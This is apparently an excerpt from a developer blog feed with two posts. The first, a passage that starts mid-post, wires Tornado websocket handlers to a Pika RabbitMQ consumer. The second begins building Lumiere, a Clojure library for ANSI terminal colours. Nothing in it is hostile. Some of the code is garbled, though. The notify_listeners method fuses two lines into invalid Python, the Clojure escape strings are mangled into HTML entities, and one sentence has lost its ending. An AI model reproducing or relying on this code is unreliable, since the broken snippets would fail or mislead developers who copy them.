<p>I&rsquo;ve heard good things about <a href="http://www.tornadoweb.org">Tornado</a>. Having read their docs on <a href="http://www.tornadoweb.org/documentation/websocket.html">websocket request handler</a>, I felt it&rsquo;s straightforward enough for me, so I chose Tornado as my backend.</p>

<h2>Pika</h2>

<p>One problem arises, though: The tornado server will run as a regular server, waiting for incoming websocket connections. The RabbitMQ consumer also needs to be in the same process event loop, waiting for incoming messages from the message queue. I looked into a few solutions such as <a href="http://pypi.python.org/pypi/sparkplug/">sparkplug</a> and <a href="http://pypi.python.org/pypi/stormed-amqp/0.1">stormed-amqp</a>, neither seem to be a good hit here. Finally, I stumbled on <a href="https://github.com/pika/pika">Pika</a>. It comes with a Tornado event loop adapter, which allows rabbitmq consumer and websocket handlers to run inside the same event loop. Perfect.</p>

<p>The entry point looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">application</span> <span class="o">=</span> <span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">([</span>
</span><span class='line'>    <span class="p">(</span><span class="s">r&#39;/ws&#39;</span><span class="p">,</span> <span class="n">handlers</span><span class="o">.</span><span class="n">MyWebSocketHandler</span><span class="p">),</span>
</span><span class='line'><span class="p">])</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span><span class="n">color</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io_loop</span> <span class="o">=</span> <span class="n">tornado</span><span class="o">.</span><span class="n">ioloop</span><span class="o">.</span><span class="n">IOLoop</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># PikaClient is our rabbitmq consumer</span>
</span><span class='line'>    <span class="n">pc</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">PikaClient</span><span class="p">(</span><span class="n">io_loop</span><span class="p">)</span>
</span><span class='line'>    <span class="n">application</span><span class="o">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">pc</span>
</span><span class='line'>    <span class="n">application</span><span class="o">.</span><span class="n">pc</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">application</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">8888</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io_loop</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">MyWebSocketHandler</span><span class="p">(</span><span class="n">tornado</span><span class="o">.</span><span class="n">websocket</span><span class="o">.</span><span class="n">WebSocketHandler</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">open</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;WebSocket opened&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">on_close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;WebSocket closed&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>That was straightforward. However, I&rsquo;m faced with the problem of how to make the amqp consumer notify websocket handlers when we receive a message from the message queue. We cannot get the handler instances from the tornado application object. Note, each websocket connection has a corresponding <code>MyWebSocketHandler</code> instance. The instances are not available from the application object. Maybe there&rsquo;s a way to get them by other means, but I&rsquo;m not familiar with the tornado API enough to know that.</p>

<p>However, from the handler, we do get the <code>application</code> object, and because we attached pika_client (our amqp consumer) to the application, we have access to it inside our socket handler. Hey, how about registering the handler with the client when the websocket is connected, and let the client &ldquo;notify&rdquo; the handler when events are received? Hey, isn&rsquo;t that the <a href="http://en.wikipedia.org/wiki/Observer_pattern">observer pattern</a>?</p>

<p>Here&rsquo;s the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">MyWebSocketHandler</span><span class="p">(</span><span class="n">websocket</span><span class="o">.</span><span class="n">WebSocketHandler</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">open</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="n">pc</span><span class="o">.</span><span class="n">add_event_listener</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;WebSocket opened&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">on_close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;WebSocket closed&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="n">pc</span><span class="o">.</span><span class="n">remove_event_listener</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, our <code>PikaClient</code> object need to support <code>add_event_listener()</code> and <code>remove_event_listener()</code> methods.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">PikaClient</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">io_loop</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: __init__&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">io_loop</span> <span class="o">=</span> <span class="n">io_loop</span>
</span><span class='line'>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connected</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connecting</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">event_listeners</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([])</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">connecting</span><span class="p">:</span>
</span><span class='line'>            <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: Already connecting to RabbitMQ&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: Connecting to RabbitMQ&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connecting</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">cred</span> <span class="o">=</span> <span class="n">pika</span><span class="o">.</span><span class="n">PlainCredentials</span><span class="p">(</span><span class="s">&#39;guest&#39;</span><span class="p">,</span> <span class="s">&#39;guest&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">param</span> <span class="o">=</span> <span class="n">pika</span><span class="o">.</span><span class="n">ConnectionParameters</span><span class="p">(</span>
</span><span class='line'>            <span class="n">host</span><span class="o">=</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span>
</span><span class='line'>            <span class="n">port</span><span class="o">=</span><span class="mi">5672</span><span class="p">,</span>
</span><span class='line'>            <span class="n">virtual_host</span><span class="o">=</span><span class="s">&#39;/&#39;</span><span class="p">,</span>
</span><span class='line'>            <span class="n">credentials</span><span class="o">=</span><span class="n">cred</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span> <span class="o">=</span> <span class="n">TornadoConnection</span><span class="p">(</span><span class="n">param</span><span class="p">,</span>
</span><span class='line'>            <span class="n">on_open_callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_connected</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">add_on_close_callback</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">on_closed</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">on_connected</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">connection</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: connected to RabbitMQ&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connected</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span> <span class="o">=</span> <span class="n">connection</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">channel</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">on_channel_open</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">on_channel_open</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">channel</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: Channel open, Declaring exchange&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span> <span class="o">=</span> <span class="n">channel</span>
</span><span class='line'>        <span class="c"># declare exchanges, which in turn, declare</span>
</span><span class='line'>        <span class="c"># queues, and bind exchange to queues</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">on_closed</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">connection</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: rabbit connection closed&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">io_loop</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">on_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: message received: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">body</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">notify_listeners</span><span class="p">(</span><span class="n">event_factory</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">notify_listeners</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event_obj</span><span class="p">):</span>
</span><span class='line'>        <span class="c"># here we assume the message the sourcing app</span>
</span><span class='line'>        <span class="c"># post to the message queue is in JSON format</span>
</span><span class='line'>        <span class="n">event_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">event_ostener</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">event_listeners</span><span class="p">:</span>
</span><span class='line'>            <span class="n">listener</span><span class="o">.</span><span class="n">write_message</span><span class="p">(</span><span class="n">event_json</span><span class="p">)</span>
</span><span class='line'>            <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: notified </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">listener</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">add_event_listener</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">listener</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">event_listeners</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">listener</span><span class="p">)</span>
</span><span class='line'>        <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: listener </span><span class="si">%s</span><span class="s"> added&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">listener</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">remove_event_listener</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">listener</span><span class="p">):</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">event_listeners</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">listener</span><span class="p">)</span>
</span><span class='line'>            <span class="n">pika</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;PikaClient: listener </span><span class="si">%s</span><span class="s"> removed&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">listener</span><span class="p">))</span>
</span><span class='line'>        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
</span><span class='line'>            <span class="k">pass</span>
</span></code></pre></td></tr></table></div></figure>


<p>I left out the queue setup code here for brevity. <code>on_message</code> callback is called when the consumer gets a message from the queue. The client, in turn, notifies all registered websocket handlers. Obviously, in real applications, you may want to do some kind of credentials and filtering, so the right message get to the right receiver. Then we simply call <code>handler.write_message()</code>, so the message gets relayed to the front-end&rsquo;s websocket.onmessage callback.</p>

<p>Here&rsquo;s some front-end code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">$</span><span class="p">){</span>
</span><span class='line'>    <span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s1">&#39;ws://localhost:8888/ws&#39;</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">){</span>
</span><span class='line'>            <span class="nx">alert</span><span class="p">(</span><span class="nx">evt</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">});</span>
</span><span class='line'><span class="p">})(</span><span class="nx">jQuery</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yes, we simply echo the message back. For the hackoff, I did parse the data, render a slightly more detailed notification message, and display the notification using jquery-toaster.</p>

<h2>Conclusion</h2>

<p>This is my first stab at websocket and the tornado web framework. I&rsquo;m not an expert on either subject, so chances are there are better ways to achieve the same result.</p>

<p>I think websocket is a very interesting technology. It opens a wide range of possibilities for more interactive and engaging web applications. Our web application is of traditional architecture: server renders most of the page, and every request involves page loads. Having a websocket may not be very beneficial as the application doesn&rsquo;t have that much of user interaction. My hackoff is more of a proof of concept. However, if the application is a one-page web app (no full page reloads), the websocket model works very well.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Writing a Simple Clojure Library]]></title>
    <link href="http://kevinjqiu.github.io/2012/03/03/writing-a-simple-clojure-library/"/>
    <updated>2012-03-03T20:25:00-05:00</updated>
    <id>http://kevinjqiu.github.io/2012/03/03/writing-a-simple-clojure-library</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been learning/using Clojure on and off for about 2 years. The lispy syntax isn&rsquo;t a deterrent for me at all, in fact, I&rsquo;m quite fond of it and consider it very <a href="http://en.wikipedia.org/wiki/Homoiconicity">elegant</a>. However, it does take some time to get used to. I don&rsquo;t use Clojure or anything remotely close in my day job, but I love to find something useful to implement using Clojure. In the past few days I found such niche.</p>

<h2>Terminal colours</h2>

<p>Ever wonder how some console applications can output coloured text? Most terminals and terminal emulators (think iTerm or konsole) support colour through a system of <a href="http://en.wikipedia.org/wiki/ANSI_escape_code">escape sequences</a>.</p>

<p>An Escape Sequence starts with the ASCII code for the escape character (0x1b or 33). There a list of control characters you can specify after the escape character that controls the colour and style of the text after it. For example, sending &ldquo;[31mfoo&rdquo; to a terminal means &ldquo;output red coloured text from now on&rdquo;. Everything the terminal output will be coloured red, until the terminal reads another escape sequence, including &ldquo;[ESC]0m&rdquo;, which tells the terminal to reset the styles to the default.</p>

<p>So I had this idea to implement this in Clojure as a library so that console application authors can use it to output stylized text from their application using idiomatic Clojure, and here comes <a href="https://github.com/kevinjqiu/lumiere">Lumiere</a>.</p>

<h2>Implementing it in Clojure</h2>

<h3>Design the interface</h3>

<p>What&rsquo;s our end goal here? We would like to output colour sequence wrapped text with Clojure function calls such as</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="nf">red</span> <span class="s">&quot;foo&quot;</span><span class="p">)</span> <span class="c1">; output foo in red colour</span>
</span><span class='line'><span class="p">(</span><span class="nf">bg-green</span> <span class="s">&quot;bar&quot;</span><span class="p">)</span> <span class="c1">;&quot;bar&quot; with green background colour</span>
</span><span class='line'><span class="p">(</span><span class="nf">bold</span> <span class="p">(</span><span class="nf">magenta</span> <span class="s">&quot;nyan cat&quot;</span><span class="p">))</span> <span class="c1">; bold and magenta</span>
</span><span class='line'><span class="p">(</span><span class="nb">-&gt; </span><span class="s">&quot;nyan cat&quot;</span> <span class="nv">red</span> <span class="nv">bg-white</span> <span class="nv">bold</span><span class="p">)</span> <span class="c1">; use Clojure&#39;s &quot;thread macro&quot; to combine these functions, resulting in red foreground, white background and bold &quot;nyan cat&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Toolchain</h3>

<p>I wrote a <a href="http://kevinjqiu.github.io/2011/02/11/cake-the-yummy-clojure-build-system/">blog post</a> a year ago about how I liked Cake the Clojure build system alternative to the defacto Leiningen. The recent news on this is that Cake and Leiningen are merging. This time, I decided to use Leiningen from the start. Even though Leiningen hasn&rsquo;t ported some of the Cake goodies, but I&rsquo;m hoping they will get ported soon.</p>

<h3>First working version:</h3>

<p>With <code>lein new lumiere</code>, Leiningen generates the default project layout. By default, Leiningen generates <code>src/lumiere/core.clj</code> and <code>test/lumiere/core.clj</code>. Because Lumiere is such a small script, we don&rsquo;t need the <code>'lumiere.core</code> namespace, rather I&rsquo;d like the functions to be in the <code>'lumiere</code> namespace. The easiest way is to delete <code>src/lumiere/</code> folder and create <code>lumiere.clj</code> under src. Same goes for the test file.</p>

<p>Following the spirit of TDD, off I went to write my first test:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="kd">ns </span><span class="nv">lumiere.test</span>
</span><span class='line'>  <span class="p">(</span><span class="ss">:use</span> <span class="p">[</span><span class="nv">lumiere</span><span class="p">])</span>
</span><span class='line'>  <span class="p">(</span><span class="ss">:use</span> <span class="p">[</span><span class="nv">clojure.test</span><span class="p">]))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nf">deftest</span> <span class="nv">test-only-foreground</span>
</span><span class='line'>  <span class="p">(</span><span class="nf">is</span> <span class="p">(</span><span class="nb">= </span><span class="s">&quot;&amp;#092;&amp;#048;33[30msome black text&amp;#092;&amp;#048;33[0m&quot;</span> <span class="p">(</span><span class="nf">black</span> <span class="s">&quot;some black test&quot;</span><span class="p">))))</span>
</span></code></pre></td></tr></table></div></figure>


<p>This tests that the correct sequences of characters are generated by the call to <code>(black "...")</code>. 33 is the ASCII code for .</p>

<p>To make this test pass, I added this in <code>src/lumiere.clj</code>,</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="kd">ns </span><span class="nv">lumiere</span><span class="p">)</span>
</span><span class='line'><span class="p">(</span><span class="kd">defn </span><span class="nv">black</span> <span class="p">[</span><span class="nv">text</span><span class="p">]</span>
</span><span class='line'>  <span class="p">(</span><span class="nf">format</span> <span class="s">&quot;&amp;#092;&amp;#048;33[0m&quot;</span> <span class="mi">30</span> <span class="nv">text</span><span class="p">))</span> <span class="c1">; 30 is the code for black foreground.</span>
</span></code></pre></td></tr></table></div></figure>


<p>This passes the tests, but obviously there&rsquo;s room for abstraction:
* the red foreground code is 31, green 32, etc&hellip;
* the black background code is 40, red 41, green 42, etc&hellip;</p>

<p>So here we go:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='clojure'><span class='line'><span class="p">(</span><span class="kd">defn- </span><span class="nv">colour</span> <span class="c1">; defn- makes this function private to the current namespace.</span>
</span><span class='line'>  <span class="p">([</span><span class="nv">code</span> <span class="nv">is-bg?</span><span class="p">]</span> <span class="p">(</span><span class="nf">format</span> <span class="s">&quot;&amp;#092;&amp;#048;33[%dm&quot;</span> <span class="p">(</span><span class="nb">+ </span><span class="p">(</span><span class="k">if </span><span class="nv">is-bg?</span> <span class="mi">40</span> <span class="mi">30</span><span class="p">)</span> <span class="nv">code</span><span class="p">)))</span>
</span><span class='line'>  <span class="p">([</span><span class="nv">code</span><span class="p">]</span> <span class="p">(</span><span class="nf">colour</span> <span class="nv">code</span> <span class="nv">false</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="kd">defn </span><span class="nv">black</span> <span class="p">[</span><span class="nv">text</span><span class="p">]</span> <span class="p">(</span><span class="nf">colour</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'><span class="p">(</span><span class="kd">defn </span><span class="nv">red</span> <span class="p">[</span><span class="nv">text</span><span class="p">]</span> <span class="p">(</span><span class="nf">colour</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'><span class="p">(</span><span class="kd">defn </span><span class="nv">bg-black</span> <span class="p">[</span><span class="nv">text</span><span class="p">]</span> <span class="p">(</span><span class="nf">colour</span> <span class="mi">0</span> <span class="nv">true</span><span class="p">))</span>
</span><span class='line'><span class="p">(</span><span class="kd">defn </span><span class="nv">bg-red</span> <span class="p">[</span><span class="nv">text</span><span class="p">]</span> <span class="p">(</span><span class="nf">colour</span> <span class="mi">1</span> <span class="nv">true</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Clojure supports &ldquo;default&rdquo; arguments through method overloading. Here we adjust the offset based on whether or not that colour is a foreground or background.</p>

<h3>Second take: use macro to define declaratively create colour functions</h3>

<p>One advantage of lispy syntax is the convergence of programming with meta-programming. If you read the core Clojure library code, you&rsquo;ll find that Clojure defines a few special forms and most control structures are written in macros. In my case, however, I&rsquo;m using macros to define colour/style functions in a declarative way. Some may argue it doesn&rsquo;t justify using macro for this purpose, but I just want to practice writing macros, and it does make the public interface of the library a bit prettier.</p>

<p>First off, again, we need to define what the end result should look like. I would still like the functions to remain the same, e.g., red, bg-red, black, bg-black, etc. However, defining these functions takes a lot of boilerplate code. I&rsquo;d like to simply call <code>(defcolour BLACK 0)</code> or the like to generate the <code>black</code> and <code>bg-black</code> functions for me.</p>

